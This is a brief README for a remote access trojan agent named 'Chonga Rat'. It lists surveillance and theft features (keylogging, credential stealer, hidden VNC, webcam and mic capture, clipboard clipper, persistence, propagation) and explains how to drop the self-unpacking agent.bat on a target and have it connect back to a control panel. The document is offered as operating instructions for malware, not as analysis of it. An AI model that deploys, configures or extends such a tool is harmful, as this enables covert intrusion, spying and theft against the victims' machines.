Chonga Rat agent
================

Panel       : 127.0.0.1:8790
Token       : 95173225f6b7...
Features    : screen, input, files, processes, shell, registry, clipboard, keylog, audio, tts, power, messagebox, chat, windows, hvnc, webcam, mic, desktop_audio, stealer, recon, persistence, propagation, proxy, plugins, rustdesk, clipper, control

agent.bat is the whole build. Double-click it on the target and it
unpacks itself and starts. Nothing else has to travel with it.

It needs a Python 3 on the target; the batch looks for pythonw,
python, then the py launcher, in that order.

Panel URL   : http://127.0.0.1:8787/
The agent dials the host above, so a machine on another PC needs the
panel's LAN address there and AGENT_BIND=0.0.0.0 on the panel side.
